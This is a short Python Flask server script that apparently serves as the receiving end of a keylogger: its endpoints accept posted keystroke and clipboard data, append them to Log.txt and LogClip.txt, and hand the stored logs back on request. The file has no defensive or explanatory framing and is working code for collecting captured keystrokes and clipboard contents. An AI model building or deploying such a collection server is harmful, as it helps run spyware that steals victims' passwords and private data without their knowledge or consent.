from flask import Flask, request
# python -m flask --app .\server.py run
app = Flask(__name__)

@app.route("/status")
def status():
    return "Online and stable!"

@app.route("/write", methods=['POST'])
def writeKeysData():
    dataValue = request.json["data"]
    with open('Log.txt', 'a') as f:
        for line in dataValue:
            if line == "": continue
            f.write(line)
    return f"Wrote {dataValue} to the log file"

@app.route("/writeClip", methods=['POST'])
def writeClipData():
    dataValue = request.json["data"]
    with open('LogClip.txt', 'a') as f:
        for line in dataValue:
            f.write(line)
    return f"Wrote to the clip log file"

@app.route("/getKeys", methods=['GET'])
def readKeysData():
    data = ""
    f = open('Log.txt', 'r')
    for line in f:
        data += line
    return data

@app.route("/getClip", methods=['GET'])
def readClipData():
    data = ""
    f = open('LogClip.txt', 'r')
    for line in f:
        data += line
    return data